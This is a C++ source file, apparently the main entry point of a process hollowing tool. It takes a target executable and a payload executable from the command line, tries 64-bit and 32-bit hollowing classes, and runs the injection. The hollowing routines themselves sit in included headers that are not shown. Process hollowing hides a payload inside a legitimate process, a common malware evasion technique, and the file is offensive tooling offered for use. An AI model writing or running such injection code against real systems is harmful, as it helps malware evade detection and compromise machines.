#include "HollowingInterface.hpp"
#include "Hollowing64Bit.hpp"
#include "Hollowing32Bit.hpp"
#include "exceptions/HollowingException.hpp"
#include <string>
#include <iostream>
#include <memory>

const int IMAGE_PATH_ARGUMENT_INDEX = 0;
const int TARGET_PATH_ARGUMENT_INDEX = 1;
const int PAYLOAD_PATH_ARGUMENT_INDEX = 2;
const int REQUIRED_COMMAND_LINE_ARGUMENTS = 2 + 1; // Plus one because of the always-included path of the image

template<typename T>
bool tryConstructProcessHollowing(std::unique_ptr<HollowingInterface>& holderPointer, const std::string& targetPath, const std::string& payloadPath)
{
    try
    {
        holderPointer = std::make_unique<T>(targetPath, payloadPath);

        return true;
    }
    catch (std::exception& exception)
    {
        return false;
    }
}

int main(int argc, char* argv[])
{
    if (argc < REQUIRED_COMMAND_LINE_ARGUMENTS)
    {
        std::cerr << "Not enough arguments!" << std::endl;
        std::cerr << "Example: " + std::string(argv[IMAGE_PATH_ARGUMENT_INDEX]) + " target.exe payload.exe" << std::endl;

        return 1;
    }

    std::unique_ptr<HollowingInterface> hollowing;
    std::string targetPath(argv[TARGET_PATH_ARGUMENT_INDEX]);
    std::string payloadPath(argv[PAYLOAD_PATH_ARGUMENT_INDEX]);

    if (!(tryConstructProcessHollowing<Hollowing64Bit>(hollowing, targetPath, payloadPath) ||
          tryConstructProcessHollowing<Hollowing32Bit>(hollowing, targetPath, payloadPath)))
    {
        std::cerr << "The images are incompatible!" << std::endl;

        return 1;
    }
    
    try
    {
        hollowing->hollow();
    }
    catch (HollowingException& exception)
    {
        std::cerr << exception.what() << std::endl;

        return 1;
    }

    std::cout << "Successfully hollowed!" << std::endl;

    return 0;
}